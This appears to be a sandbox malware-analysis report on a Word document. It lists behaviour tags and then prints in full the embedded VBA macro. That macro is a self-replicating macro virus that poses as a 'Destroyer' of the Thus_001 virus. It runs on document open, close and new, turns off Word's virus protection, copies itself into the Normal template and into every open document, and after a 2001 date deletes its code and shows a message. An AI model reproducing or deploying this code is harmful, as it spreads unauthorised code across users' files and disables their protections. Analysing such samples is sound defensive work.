behavior.CodeModule: May attempt to modify the VBA code
behavior.Document_Close: Runs when the Word document is closed
behavior.Document_New: Runs when a new Word document is created
behavior.Document_Open: Runs when the Word or Publisher document is opened
behavior.VBComponents: May attempt to modify the VBA code
behavior.VBProject: May attempt to modify the VBA code

docinfo.macro:
Private Sub Document_Open()
'Мені вже набрид цей гидкий Thus_001, тому я вимушений був написати цей Destroyer'
'Anti-Smyser'
'Якщо вона нашкодить комусь - ЗВИНЯЙТЕ!'
'Destroyer'
'Абдулла'
On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" And NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(5, 1) <> "'Destroyer'" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule         .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1)         .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule         .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1)         .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents         .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    
    For k = 1 To Application.Documents.Count
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" And Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(5, 1) <> "'Destroyer'" Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1)             .CodeModule.DeleteLines 1, Application.Documents.Item(k)             .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        End If
        If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
            Application.Documents.Item(k).VBProject.VBComponents.Item(1)             .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents             .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject             .VBComponents.Item(1).CodeModule.CountOfLines)
        End If
    Next k
    If Date > DateSerial(2001, 6, 16) Then
        a = MsgBox("Випускникам 2001-го - ВІВАТ!!!                                                                       =Abdulla`s Thus_001 Killer=", vbCritical, "Thus_001 Virus Destroying")
        'Farewell to the Thus_001'
         For k = 1 To Application.Documents.Count
          If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
                    Application.Documents.Item(k).VBProject.VBComponents.Item(1)                     .CodeModule.DeleteLines 1, Application.Documents.Item(k)                     .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
              Application.Documents.Item(k).Save
          End If
         Next k
        If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) = "'Anti-Smyser'" Then
                NormalTemplate.VBProject.VBComponents.Item(1).CodeModule                 .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1)                 .CodeModule.CountOfLines
        End If
        If NormalTemplate.Saved = False Then NormalTemplate.Save
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub
